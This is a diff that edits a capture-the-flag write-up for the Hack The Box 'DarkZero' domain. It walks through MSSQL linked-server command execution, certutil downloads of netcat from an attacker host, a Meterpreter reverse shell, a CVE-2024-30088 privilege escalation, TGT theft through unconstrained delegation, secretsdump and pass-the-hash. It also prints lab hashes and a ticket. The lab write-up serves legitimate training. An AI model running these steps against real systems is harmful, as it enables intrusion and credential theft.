@@ -22,12 +22,12 @@ image:
 
 ![image.png](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/78acdd0d87ed629f6cd2dc378bdcddac.png)
 
-As is common in real life pentests, you will start the DarkZero box with credentials for the following account john.w / RFulUtONCOL!
+As is common in real life pentests, you will start the DarkZero box with credentials for the following account: john.w / RFulUtONCOL!
 
 # Nmap
 
 ```shell
-─$ nmap -sC -sV -T4 10.129.244.69
+└─$ nmap -sC -sV -T4 10.129.244.69
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-05 01:44 UTC
 Nmap scan report for 10.129.244.69
 Host is up (0.33s latency).
@@ -111,9 +111,9 @@ PORT     STATE SERVICE
 
 ```
 # MSSQL Linked DB
-Let's enumerate the database. base
+Let's enumerate the database. 
 
-nothing much is happening on the DB. However there is a linked server
+Nothing much is happening on the DB. However there is a linked server:
 
 ```shell
 mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@10.129.244.69 -windows-auth
@@ -129,7 +129,7 @@ Linked Server       Local Login       Is Self Mapping   Remote Login
 DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc   
 ```
 
-We can see the user on the other database
+We can try to execute some commands on the linked server:
 
 ```shell
 SQL (darkzero\john.w  guest@master)> EXEC ('SELECT SYSTEM_USER, USER_NAME()') AT [DC02.darkzero.ext];
@@ -141,7 +141,7 @@ SQL (darkzero\john.w  guest@master)>
 
 ```
 
-Let's see if we can get code execution
+Great, now that worked let's see if we can get code execution:
 
 ```shell
 SQL (darkzero\john.w  guest@master)> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext];
@@ -159,10 +159,10 @@ SQL (darkzero\john.w  guest@master)>
 SQL (darkzero\john.w  guest@master)> 
 ```
 
-We have code exectuion so lets get a shell.
+Now that we have code execution, let's get a shell. We can host a webserver on our local box and then make a request for netcat: 
 
 ```shell
-QL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "certutil -urlcache -split -f http://10.10.14.8:8000/nc64.exe C:\Windows\Temp\nc64.exe"') AT [DC02.darkzero.ext];
+SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "certutil -urlcache -split -f http://10.10.14.8:8000/nc64.exe C:\Windows\Temp\nc64.exe"') AT [DC02.darkzero.ext];
 
 output                                                
 ---------------------------------------------------   
@@ -181,7 +181,7 @@ SQL (darkzero\john.w  guest@master)> EXEC ('xp_cmdshell "C:\Windows\Temp\nc64.ex
 ```
 # Metasploit Exploit Suggester
 
-We can get a Meterpreter shell and run an exploit suggester
+Now that we are on the secondary machine we can get a Meterpreter shell and run an exploit suggester:
 
 ```shell
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=5555 -f exe -o shell.exe
@@ -198,7 +198,7 @@ C:\Users\svc_sql\shell.exe
 shell.exe
 
 C:\Users\svc_sql>
-sf6 exploit(multi/handler) > sessions
+msf6 exploit(multi/handler) > sessions
 
 Active sessions
 ===============
@@ -243,7 +243,7 @@ Also please contact the author of logging-2.4.0 to request adding syslog into it
  9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.  
 ```
 
-We can use the auth_base
+After trying a few we can try out the auth base exploit:
 
 ```shell
 msf6 exploit(windows/local/cve_2024_30088_authz_basep) > run
@@ -270,8 +270,7 @@ nt authority\system
 C:\Windows\system32>
 
 ```
-
-We can do a hashdump
+Great, now that we are root on the machine we can do a hash dump to see if there are any credentials that may be of use:
 
 ```shell
 meterpreter > hashdump
@@ -282,10 +281,11 @@ svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f::
 DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
 darkzero$:1105:aad3b435b51404eeaad3b435b51404ee:4276fdf209008f4988fa8c33d65a2f94:::
 ```
+Unfortunately, it doesn't look like there is anything useful here.
 
 # Unconstrained Delegation 
 
-We can also check if this computer has unconstried delegation enabled
+It is always important to check if we can abuse some sort of delegation. We can upload PowerView and run a quick check: 
 
 ```shell
 PS C:\> Import-Module .\PowerView.ps1
@@ -308,20 +308,26 @@ objectsid                     : S-1-5-21-1969715525-31638512-2552845157-1000
 samaccountname                : DC02$
 
 ```
+The command Get-DomainComputer -Unconstrained returns computers that have unconstrained delegation. Since it returned DC02, any computer or user that connects to DC02 will also send their TGT. 
 
-Now that we are an admin, we can run Rubeus, and since  there is unconstrained delegation on dc02 we can authenticate from dc01 to dc02 and get a tgt. 
-Lets recap and understand why unconstrained delegation is dangerous
+Let's recap and understand why unconstrained delegation is dangerous:
 
 Unconstrained delegation is an Active Directory setting that allows a computer account (like DC02$) to impersonate users to any service after they authenticate to it. In simple terms: if a user (or another machine like DC01$) connects to a server that has unconstrained delegation enabled, that server can end up caching the user’s Kerberos TGT in memory so it can request service tickets on the user’s behalf later.
 
 * If we get admin/SYSTEM on a machine with unconstrained delegation (like DC02), we can monitor for incoming authentications and steal TGTs as they appear.
 * A stolen TGT can then be used to authenticate as that principal without knowing their password (pass-the-ticket style).
 
+Let's run Rubeus in monitor mode to listen for any connections.
+
 ```shell
 Rubeus.exe monitor /interval:1 /nowrap
 ```
 
-Since there is unconstrained delegation on dc02, we can authenticate from dc01 to dc02 and get a tgt
+Because we have database access on DC01 we can potentially abuse the xp_dirtree command to authenticate to DC02. Since the connection is coming from DC01, we will receive a TGT. The reason this works is because:
+* xp_dirtree \\DC02\share is a SMB connection from DC01 to DC02
+* For SMB to authenticate, DC01 must present a TGT to DC02
+* Because DC02 has unconstrained delegation, it copies and caches the TGT of the connecting machine (DC01$)
+
 
 ```shell
 └─$ mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@10.129.244.174 -windows-auth
@@ -343,7 +349,7 @@ SQL (darkzero\john.w  guest@master)>
 
 ```
 
-Now, if we go back to Rubeus, we should see a tgt
+Now, if we go back to Rubeus, we should see a TGT:
 
 ```shell
 [*] 10/8/2025 4:50:56 AM UTC - Found new TGT:
@@ -358,7 +364,7 @@ Now, if we go back to Rubeus, we should see a tgt
     doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDYzlnOVPXESUgq6fYVRrlh3Q6seVk1twju8JwMl4AFL/m+cOkFHmIwk61rK+7yHFDjV/U1gkFa9sCBYisETGBGLP9v36nh4Ai7QX+GMSvsxCOpfvshUbnLPNGX0kIISI5ey49ImXwHmLTGwQRtbUdcj3TS0KTSUP6Ej5alu5dEOxaAf5287xrUMWtT4kjuIl1Qm064CDtpHHaEI8mlQlYs0s7HkYM09PZ++X2Mxn9O/ge1p2Ap7zq5brV2rx8aQnrugTQqT18l19kWSH4gSHtr2dPoOywHkZojk1fbuzkI1+NKWvwC8WYst0MM9ZR9bTGvUwuhIYlva/BlO7Y/nSX+zcaAtVtzuJ0JMlbL9ei6XttFkKjT10r78xlEgWqF6OQEMZmkOlCZSNdU0aB3JKMBpkrzIh0weg6c8uazR6S+/GXDiow6oA1bNR0KAShdCFKE7s/5LpF7oppLh45C97nXJqQfrT1iVx6X4T7VVConEbHNfDGIuR0Ff1bxN+DzQp22i6oAmL7ANjBwV3GiXfxre5vhsySvCauylFS/8YJfVJ/bnsGItEhsxdZ2HJb13eawearky+dxU2AExgsM0bElOJiUdWUUWSz8xZkinLU2UQL/zsh+M025h5wXbzo1xEmzD5mw//382ccJ/lu6xW7Uk5S2+t9akilIHaQmtLJJ4oOgzuqh21lNYMlynWylWcjsI48v/0Cvx/fTPIjACeGXwFuhclzAOetArxH+klzkGWMIAWex7udME3YNEM/jVrKW1gdEqCd1G/Cpxnfbs+hJBcgyxV743t/C4lL/VkiYmchrNzk0gaaFwjcVp4jRz1HLLdrFHPZK5yrKSKySa++rtvOStjGWsA/lz90VTf8nlnDBqH7vkhjBONLAhN7PgvX1wVlDTCy+I2BiPiPHRinv6aKVD7vaN6zKq+nChIO+eK0fKU66h3Uy2tuoe6mt9BEqYiw2kmtLzkZdsCHriakWwOgP359HHgRmzJX0HuGxhop21EEBR1Pab3AyndMl9qpdxCPqOH6X0QlgoFyhmiP0ORbEU86diD1LsQJR/cTg9jAMPpCLMZavtEH15tSm0omhlSpEEaFXxVWIrB2pAPdflSjZ5v7da8C36CXK0uD5AzMLxBJW9EElnQJRt02FbycZ5jj1pTZCPMOLmJi7CDZSxBjXPUOBGp/LgNu6Aaz6c4qwpzpChwwTc5oFBFQ96bnDjAr3H5K6ecULsb2olmU2FJrxSH0yxFudNGr9ST/kK1TXjI3erHUaqT3c0vtww5pywm4NE7jk+sIJDO+ihWNd6ooZgYbtj//ecNLfIbgc0UjHwmqacLk5jJ94S36dLFdbfkGzMLsdKA3qlnMyG5dWlMD+1uJlXyaAb5hDlq5twb2hQxxDRg7X9bMmvuEo5dx6RbsEjPzwo7/c2Om34ArsTSQEDhhQro4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgjsFVMQF4zUdhqGVU495/N+piIsZQmbUHsp6fcpBt3JuhDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMDgwNDUwNTZaphEYDzIwMjUxMDA4MTQ1MDU2WqcRGA8yMDI1MTAxNTA0NTA1NlqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=
 ```
 
-Now let's get it into a valid format
+Now let's get it into a valid format:
 
 ```shell
 └─$ cat > dc01.tgt.b64 << 'EOF'
@@ -366,15 +372,15 @@ doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+g
 EOF
 ```
 
-Convert it from b64, use the ticket converter, then export it
+Convert it from b64, use the ticket converter, then export it:
 
 ```shell
- base64 -d dc01.tgt.b64 > dc01.kirbi
- ticketConverter.py dc01.kirbi Administrator.ccache
+base64 -d dc01.tgt.b64 > dc01.kirbi
+ticketConverter.py dc01.kirbi Administrator.ccache
 export KRB5CCNAME=Administrator.ccache
 ```
 
-Check if it's in the cache
+Check if it's in the cache:
 
 ```shell
 ──(kali㉿kali)-[~/boxes/darkzero]
@@ -387,10 +393,10 @@ Valid starting       Expires              Service principal
         renew until 10/15/2025 15:50:56                                                                           
 ```
 
-and dump the secrets
+And dump the secrets:
 
 ```shell
-─$ impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
+└─$ impacket-secretsdump -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb'
 
 Impacket v0.13.0.dev0+20250904.2110.6864c8b4 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -427,13 +433,12 @@ darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
 
 ```
 
-Let's get the flag
+Let's get the flag:
 
 ```shell
-─(kali㉿kali)-[~/boxes/darkzero]
 └─$ netexec smb darkzero.htb -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x 'type C:\users\Administrator\Desktop\root.txt' 
 SMB         10.129.244.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
 SMB         10.129.244.174  445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
 SMB         10.129.244.174  445    DC01             [+] Executed command via wmiexec
 SMB         10.129.244.174  445    DC01             d193b00ea2a014aa63b1b2ede1bd6a87
-                                                                                                 
+```
